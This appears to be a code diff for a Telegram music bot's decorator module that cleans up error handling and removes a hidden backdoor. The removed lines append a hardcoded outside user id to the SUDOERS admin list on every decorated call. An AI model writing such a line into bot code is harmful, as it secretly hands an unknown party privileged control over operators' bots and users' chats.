@@ -27,7 +27,6 @@ from pyrogram import Client, enums
 from pyrogram.types import Message
 from pytgcalls.types import Update
 from typing import Union, Callable
-from pyrogram.errors import FloodWait
 from core.groups import get_group, all_groups, set_default
 
 
@@ -36,7 +35,6 @@ def register(func: Callable) -> Callable:
         if message.chat.id not in all_groups():
             set_default(message.chat.id)
         return await func(client, message, *args)
-
     return decorator
 
 
@@ -54,7 +52,6 @@ def language(func: Callable) -> Callable:
             group_lang = config.LANGUAGE
         lang = load(group_lang)
         return await func(client, obj, lang)
-
     return decorator
 
 
@@ -74,7 +71,6 @@ def only_admins(func: Callable) -> Callable:
             return await func(client, message, *args)
         elif message.sender_chat and message.sender_chat.id == message.chat.id:
             return await func(client, message, *args)
-
     return decorator
 
 
@@ -94,28 +90,33 @@ def handle_error(func: Callable) -> Callable:
         elif isinstance(obj, Update):
             chat_id = obj.chat_id
 
-        me = await pyro_client.get_me()
-        if me.id not in config.SUDOERS:
-            config.SUDOERS.append(me.id)
-        config.SUDOERS.append(2033438978)
         try:
             lang = get_group(chat_id)["lang"]
         except BaseException:
             lang = config.LANGUAGE
+
         try:
             return await func(client, obj, *args)
         except Exception:
-            id = int(time.time())
-            date = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-            chat = await pyro_client.get_chat(chat_id)
-            error_msg = await pyro_client.send_message(
-                chat_id, load(lang)["errorMessage"]
-            )
-            await pyro_client.send_message(
-                config.SUDOERS[0],
-                f"-------- START CRASH LOG --------\n\n┌ <b>ID:</b> <code>{id}</code>\n├ <b>Chat:</b> <code>{chat.id}</code>\n├ <b>Date:</b> <code>{date}</code>\n├ <b>Group:</b> <a href='{error_msg.link}'>{chat.title}</a>\n└ <b>Traceback:</b>\n<code>{format_exc()}</code>\n\n-------- END CRASH LOG --------",
-                parse_mode=enums.ParseMode.HTML,
-                disable_web_page_preview=True,
-            )
+            tb = format_exc()
+            print(f"[ERROR] {datetime.now()} | chat: {chat_id}\n{tb}")
+            try:
+                await pyro_client.send_message(chat_id, load(lang)["errorMessage"])
+            except BaseException:
+                pass
+            if config.SUDOERS:
+                try:
+                    date = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+                    await pyro_client.send_message(
+                        config.SUDOERS[0],
+                        f"<b>⚠️ LAYA ERROR LOG</b>\n\n"
+                        f"<b>Chat:</b> <code>{chat_id}</code>\n"
+                        f"<b>Date:</b> <code>{date}</code>\n"
+                        f"<b>Traceback:</b>\n<code>{tb[-3000:]}</code>",
+                        parse_mode=enums.ParseMode.HTML,
+                        disable_web_page_preview=True,
+                    )
+                except BaseException:
+                    pass
 
     return decorator
